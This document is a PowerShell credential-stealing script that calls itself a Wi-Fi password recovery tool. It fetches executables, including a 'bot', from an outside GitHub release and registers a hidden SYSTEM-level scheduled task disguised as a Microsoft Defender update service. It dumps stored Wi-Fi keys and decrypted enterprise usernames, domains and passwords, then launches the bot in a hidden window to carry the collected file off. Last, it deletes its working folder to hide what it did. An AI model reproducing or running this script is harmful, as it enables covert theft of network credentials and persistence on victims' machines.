#Fully Functional script to recover Usernames and Passwords for Enterprice Networks.
$boturl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/Registry.exe"
$extractorurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/EnterpriseWifiPasswordRecover.exe"
$psexecurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/psexec.exe"
$basepath = "C:\Users\Public\Workdir"
$profilesFolderPath = Join-Path -Path $basepath -ChildPath "profiles"
$extractorexe = Join-Path -Path $basepath -ChildPath "EnterpriseWifiPasswordRecover.exe"
$wifiReapsFilePath = Join-Path -Path $basepath -ChildPath "WifiReaps.txt"
$botpath = Join-Path -Path $basepath -ChildPath "Registry.exe"
$psexecexe = Join-Path -Path $basepath -ChildPath "psexec.exe"
$decryptedFilePattern = "decrypted*"
$pingdaemontask = "Wifi Sync"
$decryptedContent = $null
$wifiProfilesOutput = $null

#General
#directory creation.

if (-not (Test-Path -Path $basepath)) {
  New-Item -ItemType Directory -Path $basepath | Out-Null
}

# Download files from URLs
try {
  Invoke-WebRequest -Uri $boturl -OutFile $botpath -UseBasicParsing
  Invoke-WebRequest -Uri $extractorurl -OutFile $extractorexe -UseBasicParsing
  Invoke-WebRequest -Uri $psexecurl -OutFile $psexecexe -UseBasicParsing
} catch {}


#Stage1 Prompt.
$Name = "Running Stage1 of Extractor"
$pwdst = Read-Host "Proceed With $Name (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
	Start-Sleep -Seconds 1
	$pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
	Write-Host "Proceeding with $Name..."
  
# XML for the scheduled task
$pingdaemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-24T19:20:37.0889003</Date>
    <Author>Microsoft\System</Author>
    <URI>\Microsoft Defender Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\Public\Workdir\EnterpriseWifiPasswordRecover.exe</Command>
      <WorkingDirectory>C:\Users\Public\Workdir</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
  # Check if the task exists, if it does, unregister it
  if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false -ErrorAction SilentlyContinue
  }
  Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
  Start-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue
  if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false -ErrorAction SilentlyContinue
  }
  Set-Location $basepath
  #exit #Mobile edit, commented our, it is causing session drops.
} else {}

#Cleanup and data transport.
$Name = "Cleanup and Data Transport"
$pwdst = Read-Host "Proceed With $Name (y/n)"
if ([string]::IsNullOrEmpty($pwdst)) {
	Start-Sleep -Seconds 1
	$pwdst = "n"
}
if ($pwdst.ToLower() -eq "y") {
	Write-Host "Proceeding with $Name..."  
  # Check if the decrypted file exists
  $decryptedFilePath = Get-ChildItem -Path $profilesFolderPath -Filter $decryptedFilePattern -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
  # Read the content of the decrypted file if it exists
  if ($null -ne $decryptedFilePath) {
      $decryptedContent = Get-Content $decryptedFilePath -Raw
      # Extract username, domain, and password from decrypted file content
      $username = $decryptedContent | Select-String -Pattern 'Username: (.+)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
      $password = $decryptedContent | Select-String -Pattern 'Password: (.+)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
      $domain = $decryptedContent | Select-String -Pattern 'Domain: (.+)' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
  
      # Create a table containing the decrypted values
      $decryptedTable = [PSCustomObject]@{
          Username = $username
          Password = $password
          Domain = $domain
      }
  }
  # Run the command to get Wi-Fi profiles and passwords
  $wifiProfilesOutput = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
      $name = $_.Matches.Groups[1].Value.Trim()
      (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
          $pass = $_.Matches.Groups[1].Value.Trim()
          [PSCustomObject]@{
              PROFILE_NAME = $name
              PASSWORD = $pass
          }
      }
  }
  # Format decryptedTable and wifiProfilesOutput separately
  $decryptedFormatted = $null
  $wifiFormatted = $null
  if ($null -ne $decryptedTable ) {
      $decryptedFormatted = $decryptedTable | Format-Table -AutoSize | Out-String
  }
  if ($null -ne $wifiProfilesOutput) {
      $wifiFormatted = $wifiProfilesOutput | Format-Table -Property PROFILE_NAME, PASSWORD -AutoSize | Out-String
  }
  # Combine decryptedFormatted and wifiFormatted
  if ($null -ne $decryptedFormatted -and $null -ne $wifiFormatted) {
      $formattedContent = "Decrypted File Content:`n$decryptedFormatted`n`nWi-Fi Profiles Output:`n$wifiFormatted"
  } elseif ($null -ne $decryptedFormatted) {
      $formattedContent = "Decrypted File Content:`n$decryptedFormatted"
  } elseif ($null -ne $wifiFormatted) {
      $formattedContent = "Wi-Fi Profiles Output:`n$wifiFormatted"
  } else {
      Write-Host "No data to write to WifiReaps file."
      exit
  }
  # Write the formatted content to WifiReaps file
  Set-Content -Path $wifiReapsFilePath -Value $formattedContent
  # Print the content of the WifiReaps file in the terminal
  Get-Content -Path $wifiReapsFilePath
  # If bot path exists, start the process
  if (Test-Path $botpath) {
      Start-Process -FilePath $botpath -ArgumentList "-File `"$wifiReapsFilePath`"" -WindowStyle Hidden
  }
  # Clean up
  Start-Sleep -Seconds 3
  Remove-Item -Path $basepath -Force -Recurse
  # Print the content of the WifiReaps file in the terminal
} else {}
